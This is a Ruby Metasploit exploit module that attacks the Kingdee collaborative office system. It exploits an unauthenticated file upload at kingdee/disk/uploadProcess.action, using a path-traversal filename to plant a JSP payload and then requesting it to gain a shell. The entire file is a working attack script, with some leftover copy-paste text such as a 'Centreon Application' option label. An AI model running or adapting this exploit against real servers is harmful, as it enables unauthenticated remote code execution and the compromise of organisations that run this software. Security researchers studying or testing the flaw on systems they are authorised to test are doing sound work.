require 'msf/core'
class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking
  include Msf::Exploit::Remote::HttpClient

  def initialize(info = {})
    super(update_info(info,
                      'Name' => '金蝶协作办公系统任意文件上传getshell',
                      'Description' => %q{
                            kingdee/disk/uploadProcess.action，无需登录认证即可上传任意文件
                                 },
                      'Author' =>
                          [
                              '路人甲',
                              '扶摇直上打飞机'
                          ],
                      'License' => MSF_LICENSE,
                      'References' =>
                          [
                              ['url', 'http://www.wooyun.org/bugs/wooyun-2015-0142668']
                          ],
                      'Privileged' => true,
                      'Platform' => ['linux','win'],
                      'Targets' => [['all of them', {}],],
                      'Arch' => ARCH_JAVA,
                      'DefaultTarget' => 0,
          ))
    register_options(
        [
            Opt::RHOST(),
            Opt::RPORT(80),
            OptString.new('TARGETURI', [true, 'The URI of the Centreon Application', '/']),
        ], self.class)
  end

  def getcookie
    res = send_request_cgi({
                               'method' => 'GET',
                               'uri' => normalize_uri(target_uri.path, 'kingdee', 'disk', 'uploadProcess.action?parent=1&path=/&user_id=2'),
                           })
    cookie = res.get_cookies
    return cookie
  end

  def upload
    @fcname = "#{rand_text_alphanumeric(rand(10)+6)}.jsp"
    @fname = "../../#{@fcname}"

    post_data = payload.encoded

    data = Rex::MIME::Message.new
    data.add_part(post_data, 'application/octet-stream', nil, "form-data; name=\"file\"; filename=\"#{@fname}\"")
    data.add_part('upload', nil, nil, "form-data; name=\"upload\"")
    post_data = data.to_s

    print_status("Uploading #{@fcname} payload...")

    res = send_request_cgi({
                               'method' => 'POST',
                               'uri' => normalize_uri(target_uri.path, 'kingdee', 'disk', 'uploadProcess.action?parent=1&path=/&user_id=2'),
                               'ctype' => "multipart/form-data; boundary=#{data.bound}",
                               'cookie' => getcookie,
                               'data' => post_data,
                           })
    if res.code.to_s == '200'
      shellpath = normalize_uri(target_uri.path, 'kingdee', 'disk', 'upload', @fcname)
      print_good("Shell address：#{shellpath}")
      print_status("Executing the payload...")
      send_request_cgi(
          {
              'uri' => normalize_uri(target_uri.path, 'kingdee', 'disk', 'upload', @fcname),
              'method' => 'GET',
          }, 5)
      print_good("Executed payload")
    else
      fail_with(Failure::Unknown, "#{rhost} cant get crumb value ")
    end
  end

  def exploit
    upload
  end

  def rhost
    datastore['RHOST']

  end

  def rport
    datastore['RPORT']
  end

  def targeturi
    datastore['TARGETURI']
  end

end
